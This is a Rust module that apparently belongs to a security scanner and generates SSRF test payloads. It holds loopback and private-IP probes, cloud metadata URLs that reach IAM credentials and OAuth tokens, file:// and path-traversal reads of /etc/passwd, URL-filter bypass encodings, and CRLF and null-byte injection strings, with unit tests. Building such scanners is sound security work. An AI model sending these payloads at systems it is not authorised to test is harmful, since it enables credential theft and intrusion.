//! SSRF probes for testing various targets and protocols

use url::Url;

/// Internal IP ranges (RFC1918, loopback, link-local, IPv6)
pub const INTERNAL_IP_RANGES: &[&str] = &[
    // Loopback (IPv4)
    "127.0.0.1",
    "127.0.0.2",
    "127.1.1.1",
    "localhost",
    
    // Loopback (IPv6)
    "[::1]",
    "[0:0:0:0:0:0:0:1]",
    
    // RFC1918 private networks
    "10.0.0.1",
    "10.0.0.2",
    "10.1.1.1",
    "192.168.0.1",
    "192.168.1.1",
    "192.168.1.254",
    "172.16.0.1",
    "172.31.255.254",
    
    // Link-local
    "169.254.169.254", // AWS/Cloud metadata
    "169.254.1.1",
    
    // Alternative representations (decimal, octal)
    "2130706433",      // 127.0.0.1 in decimal
    "0177.0.0.1",      // 127.0.0.1 in octal
    "0x7f.0x0.0x0.0x1", // 127.0.0.1 in hex
];

/// Cloud metadata endpoints (with header requirements noted)
pub const CLOUD_METADATA_ENDPOINTS: &[&str] = &[
    // AWS (no special headers required for IMDSv1)
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/dynamic/instance-identity/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    
    // AWS (IPv6)
    "http://[fd00:ec2::254]/latest/meta-data/",
    
    // Google Cloud (requires Metadata-Flavor: Google header)
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata/computeMetadata/v1/",
    "http://169.254.169.254/computeMetadata/v1/",
    
    // Azure (requires Metadata: true header)
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    
    // DigitalOcean
    "http://169.254.169.254/metadata/v1/",
    "http://169.254.169.254/metadata/v1/id",
    
    // Oracle Cloud
    "http://169.254.169.254/opc/v1/instance/",
    "http://169.254.169.254/opc/v2/instance/",
    
    // Alibaba Cloud
    "http://100.100.100.200/latest/meta-data/",
];

/// Non-HTTP schemes to test
pub const NON_HTTP_SCHEMES: &[&str] = &[
    "file://",
    "gopher://",
    "ftp://",
    "dict://",
    "sftp://",
    "tftp://",
    "ldap://",
];

/// Common internal service ports
pub const INTERNAL_PORTS: &[u16] = &[
    22,    // SSH
    80,    // HTTP
    443,   // HTTPS
    3306,  // MySQL
    5432,  // PostgreSQL
    6379,  // Redis
    8080,  // HTTP alternate
    8443,  // HTTPS alternate
    9200,  // Elasticsearch
    27017, // MongoDB
];

/// SSRF probe generator
#[derive(Debug, Clone)]
pub struct SsrfProbeGenerator;

impl SsrfProbeGenerator {
    pub fn new() -> Self {
        Self
    }
    
    /// Generate benign external probes for reachability testing
    pub fn generate_external_probes(&self) -> Vec<String> {
        vec![
            "http://example.com".to_string(),
            "https://example.com".to_string(),
            "http://httpbin.org/get".to_string(),
            "https://httpbin.org/get".to_string(),
        ]
    }
    
    /// Generate internal IP probes
    pub fn generate_internal_ip_probes(&self) -> Vec<String> {
        INTERNAL_IP_RANGES
            .iter()
            .map(|ip| format!("http://{}", ip))
            .collect()
    }
    
    /// Generate internal IP probes with ports
    pub fn generate_internal_ip_port_probes(&self) -> Vec<String> {
        let mut probes = Vec::new();
        
        for ip in INTERNAL_IP_RANGES.iter().take(5) {
            for port in INTERNAL_PORTS.iter().take(3) {
                probes.push(format!("http://{}:{}", ip, port));
            }
        }
        
        probes
    }
    
    /// Generate cloud metadata probes
    pub fn generate_metadata_probes(&self) -> Vec<String> {
        CLOUD_METADATA_ENDPOINTS
            .iter()
            .map(|s| s.to_string())
            .collect()
    }
    
    /// Generate non-HTTP scheme probes
    pub fn generate_scheme_probes(&self, base_target: &str) -> Vec<String> {
        let mut probes = Vec::new();
        
        for scheme in NON_HTTP_SCHEMES {
            // file:// probes
            if scheme.starts_with("file://") {
                probes.push(format!("{}etc/passwd", scheme));
                probes.push(format!("{}c:/windows/win.ini", scheme));
                probes.push(format!("{}/etc/hosts", scheme));
                probes.push(format!("{}/etc/passwd", scheme));
                probes.push("file:///etc/passwd".to_string());
                probes.push("file:///etc/hosts".to_string());
                probes.push("file:///c:/windows/win.ini".to_string());
            } else {
                // Other schemes with base target
                probes.push(format!("{}{}", scheme, base_target));
            }
        }
        
        // Add path traversal payloads (these work even without file:// scheme)
        probes.push("../../../../../../etc/passwd".to_string());
        probes.push("../../../../../../../etc/passwd".to_string());
        probes.push("..\\..\\..\\..\\..\\..\\..\\windows\\win.ini".to_string());
        probes.push("/etc/passwd".to_string());
        probes.push("c:/windows/win.ini".to_string());
        probes.push("/etc/hosts".to_string());
        
        probes
    }
    
    /// Generate URL bypass techniques
    pub fn generate_bypass_probes(&self, target: &str) -> Vec<String> {
        let mut probes = Vec::new();
        
        // Try to parse target as URL
        if let Ok(url) = Url::parse(target) {
            if let Some(host) = url.host_str() {
                // IP encoding bypasses
                if let Ok(ip) = host.parse::<std::net::Ipv4Addr>() {
                    let octets = ip.octets();
                    
                    // Decimal notation
                    let decimal = u32::from_be_bytes(octets);
                    probes.push(format!("http://{}", decimal));
                    
                    // Octal notation
                    probes.push(format!(
                        "http://0{:o}.0{:o}.0{:o}.0{:o}",
                        octets[0], octets[1], octets[2], octets[3]
                    ));
                    
                    // Hex notation
                    probes.push(format!(
                        "http://0x{:02x}.0x{:02x}.0x{:02x}.0x{:02x}",
                        octets[0], octets[1], octets[2], octets[3]
                    ));
                }
                
                // URL encoding
                probes.push(target.replace(":", "%3A").replace("/", "%2F"));
                
                // Double encoding
                probes.push(target.replace(":", "%253A").replace("/", "%252F"));
                
                // @ bypass (user@host)
                probes.push(format!("http://trusted.com@{}", host));
                
                // # bypass (fragment)
                probes.push(format!("http://trusted.com#{}", target));
                
                // Backslash bypass (Windows)
                probes.push(target.replace("/", "\\"));
            }
        }
        
        probes
    }
    
    /// Generate protocol smuggling probes
    pub fn generate_smuggling_probes(&self, target: &str) -> Vec<String> {
        vec![
            // CRLF injection
            format!("{}\r\nX-Injected: true", target),
            
            // Newline injection
            format!("{}\nX-Injected: true", target),
            
            // Null byte injection
            format!("{}\0.trusted.com", target),
            
            // Unicode bypass
            format!("http://{}@127.0.0.1", target.replace(".", "\u{FF0E}")),
        ]
    }
    
    /// Generate all probes for comprehensive testing
    pub fn generate_all_probes(&self, original_value: &str) -> Vec<SsrfProbe> {
        let mut probes = Vec::new();
        
        // 1. External reachability probes
        for url in self.generate_external_probes() {
            probes.push(SsrfProbe {
                payload: url.clone(),
                probe_type: SsrfProbeType::ExternalReachability,
                target: url,
                description: "Benign external endpoint for reachability testing".to_string(),
                headers: Vec::new(),
            });
        }

        // 2. Internal IP probes
        for url in self.generate_internal_ip_probes() {
            probes.push(SsrfProbe {
                payload: url.clone(),
                probe_type: SsrfProbeType::InternalIp,
                target: url.clone(),
                description: format!("Internal IP probe: {}", url),
                headers: Vec::new(),
            });
        }

        // 3. Cloud metadata probes (carry provider-required headers)
        for url in self.generate_metadata_probes() {
            let headers = metadata_headers(&url);
            probes.push(SsrfProbe {
                payload: url.clone(),
                probe_type: SsrfProbeType::CloudMetadata,
                target: url.clone(),
                description: format!("Cloud metadata endpoint: {}", url),
                headers,
            });
        }

        // 4. Non-HTTP scheme probes
        for url in self.generate_scheme_probes("example.com") {
            probes.push(SsrfProbe {
                payload: url.clone(),
                probe_type: SsrfProbeType::NonHttpScheme,
                target: url.clone(),
                description: format!("Non-HTTP scheme probe: {}", url),
                headers: Vec::new(),
            });
        }

        // 5. Bypass technique probes
        for url in self.generate_bypass_probes(original_value) {
            probes.push(SsrfProbe {
                payload: url.clone(),
                probe_type: SsrfProbeType::BypassTechnique,
                target: url.clone(),
                description: "URL encoding/bypass technique".to_string(),
                headers: Vec::new(),
            });
        }
        
        probes
    }
}

impl Default for SsrfProbeGenerator {
    fn default() -> Self {
        Self::new()
    }
}

/// Type of SSRF probe
#[derive(Debug, Clone, PartialEq)]
pub enum SsrfProbeType {
    /// Benign external endpoint for reachability testing
    ExternalReachability,
    
    /// Internal IP address (RFC1918, loopback, link-local)
    InternalIp,
    
    /// Cloud metadata endpoint
    CloudMetadata,
    
    /// Non-HTTP scheme (file, gopher, ftp, etc.)
    NonHttpScheme,
    
    /// URL encoding/bypass technique
    BypassTechnique,
    
    /// Protocol smuggling attempt
    ProtocolSmuggling,
}

/// A single SSRF probe
#[derive(Debug, Clone)]
pub struct SsrfProbe {
    /// The payload to inject
    pub payload: String,

    /// Type of probe
    pub probe_type: SsrfProbeType,

    /// Target being probed
    pub target: String,

    /// Human-readable description
    pub description: String,

    /// Headers that must accompany this probe (e.g. `Metadata-Flavor: Google`
    /// for GCP, `Metadata: true` for Azure — these endpoints reject requests
    /// without them, so omitting the header silently fails detection).
    pub headers: Vec<(String, String)>,
}

/// Required headers for a cloud metadata endpoint, keyed off the URL. GCP and
/// Azure IMDS reject requests that lack these headers.
fn metadata_headers(url: &str) -> Vec<(String, String)> {
    if url.contains("computeMetadata") || url.contains("metadata.google") {
        vec![("Metadata-Flavor".to_string(), "Google".to_string())]
    } else if url.contains("/metadata/instance") || url.contains("/metadata/identity") {
        vec![("Metadata".to_string(), "true".to_string())]
    } else {
        Vec::new()
    }
}

impl SsrfProbe {
    /// Get priority for this probe type
    pub fn priority(&self) -> u8 {
        match self.probe_type {
            SsrfProbeType::ExternalReachability => 1, // Test first
            SsrfProbeType::CloudMetadata => 2,        // High value target
            SsrfProbeType::InternalIp => 3,           // Common target
            SsrfProbeType::NonHttpScheme => 4,        // Advanced
            SsrfProbeType::BypassTechnique => 5,      // Last resort
            SsrfProbeType::ProtocolSmuggling => 6,    // Advanced
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_generate_external_probes() {
        let generator = SsrfProbeGenerator::new();
        let probes = generator.generate_external_probes();
        
        assert!(!probes.is_empty());
        assert!(probes.iter().any(|p| p.contains("example.com")));
    }
    
    #[test]
    fn test_generate_internal_ip_probes() {
        let generator = SsrfProbeGenerator::new();
        let probes = generator.generate_internal_ip_probes();
        
        assert!(!probes.is_empty());
        assert!(probes.iter().any(|p| p.contains("127.0.0.1")));
        assert!(probes.iter().any(|p| p.contains("169.254.169.254")));
    }
    
    #[test]
    fn test_generate_metadata_probes() {
        let generator = SsrfProbeGenerator::new();
        let probes = generator.generate_metadata_probes();
        
        assert!(!probes.is_empty());
        assert!(probes.iter().any(|p| p.contains("169.254.169.254")));
    }
    
    #[test]
    fn test_probe_priority() {
        let probe1 = SsrfProbe {
            payload: "test".to_string(),
            probe_type: SsrfProbeType::ExternalReachability,
            target: "test".to_string(),
            description: "test".to_string(),
            headers: Vec::new(),
        };

        let probe2 = SsrfProbe {
            payload: "test".to_string(),
            probe_type: SsrfProbeType::CloudMetadata,
            target: "test".to_string(),
            description: "test".to_string(),
            headers: Vec::new(),
        };
        
        assert!(probe1.priority() < probe2.priority());
    }
}

